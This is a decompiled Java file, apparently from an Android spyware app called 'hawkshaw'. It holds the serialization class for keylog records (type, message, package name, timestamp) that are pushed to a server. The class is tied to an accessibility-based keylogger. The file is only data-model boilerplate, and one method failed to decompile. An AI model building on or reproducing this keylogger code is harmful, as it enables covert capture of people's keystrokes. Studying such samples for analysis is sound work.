package com.hawkshaw.library.datalayer.models.accessibility;

import D3.b;
import E3.C0029h0;
import E3.H;
import E3.V;
import E3.u0;
import Y1.K;
import com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import kotlinx.serialization.encoding.Encoder;
import kotlinx.serialization.internal.PluginGeneratedSerialDescriptor;

public final class PushKeyLogsRequest$KeyLog$$serializer implements H {
    public static final PushKeyLogsRequest$KeyLog$$serializer INSTANCE;
    private static final /* synthetic */ PluginGeneratedSerialDescriptor descriptor;

    static {
        PushKeyLogsRequest$KeyLog$$serializer pushKeyLogsRequest$KeyLog$$serializer = new PushKeyLogsRequest$KeyLog$$serializer();
        INSTANCE = pushKeyLogsRequest$KeyLog$$serializer;
        PluginGeneratedSerialDescriptor pluginGeneratedSerialDescriptor = new PluginGeneratedSerialDescriptor("com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest.KeyLog", pushKeyLogsRequest$KeyLog$$serializer, 4);
        pluginGeneratedSerialDescriptor.l("type", false);
        pluginGeneratedSerialDescriptor.l("message", false);
        pluginGeneratedSerialDescriptor.l("package_name", false);
        pluginGeneratedSerialDescriptor.l("timestamp", true);
        descriptor = pluginGeneratedSerialDescriptor;
    }

    private PushKeyLogsRequest$KeyLog$$serializer() {
    }

    public KSerializer[] childSerializers() {
        u0 u0Var = u0.f536a;
        return new KSerializer[]{PushKeyLogsRequest.KeyLog.$childSerializers[0], u0Var, u0Var, V.f466a};
    }

    /* JADX DEBUG: Multi-variable search result rejected for TypeSearchVarInfo{r6v3, resolved type: java.lang.Object} */
    /* JADX DEBUG: Multi-variable search result rejected for TypeSearchVarInfo{r10v3, resolved type: com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity$Type} */
    /* JADX WARNING: Multi-variable type inference failed */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest.KeyLog deserialize(kotlinx.serialization.encoding.Decoder r17) {
        /*
            r16 = this;
            r0 = r17
            java.lang.String r1 = "decoder"
            Y1.K.n(r0, r1)
            kotlinx.serialization.descriptors.SerialDescriptor r1 = r16.getDescriptor()
            D3.a r0 = r0.a(r1)
            kotlinx.serialization.KSerializer[] r2 = com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest.KeyLog.$childSerializers
            r3 = 1
            r4 = 0
            r5 = 0
            r6 = 0
            r9 = r4
            r10 = r5
            r11 = r10
            r12 = r11
            r13 = r6
            r5 = r3
        L_0x001e:
            if (r5 == 0) goto L_0x005a
            int r6 = r0.y(r1)
            r7 = -1
            if (r6 == r7) goto L_0x0058
            if (r6 == 0) goto L_0x004c
            if (r6 == r3) goto L_0x0045
            r7 = 2
            if (r6 == r7) goto L_0x003e
            r7 = 3
            if (r6 != r7) goto L_0x0038
            long r13 = r0.D(r1, r7)
            r9 = r9 | 8
            goto L_0x001e
        L_0x0038:
            B3.m r0 = new B3.m
            r0.<init>(r6)
            throw r0
        L_0x003e:
            java.lang.String r12 = r0.q(r1, r7)
            r9 = r9 | 4
            goto L_0x001e
        L_0x0045:
            java.lang.String r11 = r0.q(r1, r3)
            r9 = r9 | 2
            goto L_0x001e
        L_0x004c:
            r6 = r2[r4]
            java.lang.Object r6 = r0.l(r1, r4, r6, r10)
            r10 = r6
            com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity$Type r10 = (com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity.Type) r10
            r9 = r9 | 1
            goto L_0x001e
        L_0x0058:
            r5 = r4
            goto L_0x001e
        L_0x005a:
            r0.c(r1)
            com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest$KeyLog r0 = new com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest$KeyLog
            r15 = 0
            r8 = r0
            r8.<init>((int) r9, (com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity.Type) r10, (java.lang.String) r11, (java.lang.String) r12, (long) r13, (E3.q0) r15)
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest$KeyLog$$serializer.deserialize(kotlinx.serialization.encoding.Decoder):com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest$KeyLog");
    }

    public SerialDescriptor getDescriptor() {
        return descriptor;
    }

    public void serialize(Encoder encoder, PushKeyLogsRequest.KeyLog keyLog) {
        K.n(encoder, "encoder");
        K.n(keyLog, "value");
        SerialDescriptor descriptor2 = getDescriptor();
        b a5 = encoder.a(descriptor2);
        PushKeyLogsRequest.KeyLog.write$Self$library_release(keyLog, a5, descriptor2);
        a5.c(descriptor2);
    }

    public KSerializer[] typeParametersSerializers() {
        return C0029h0.f501b;
    }
}
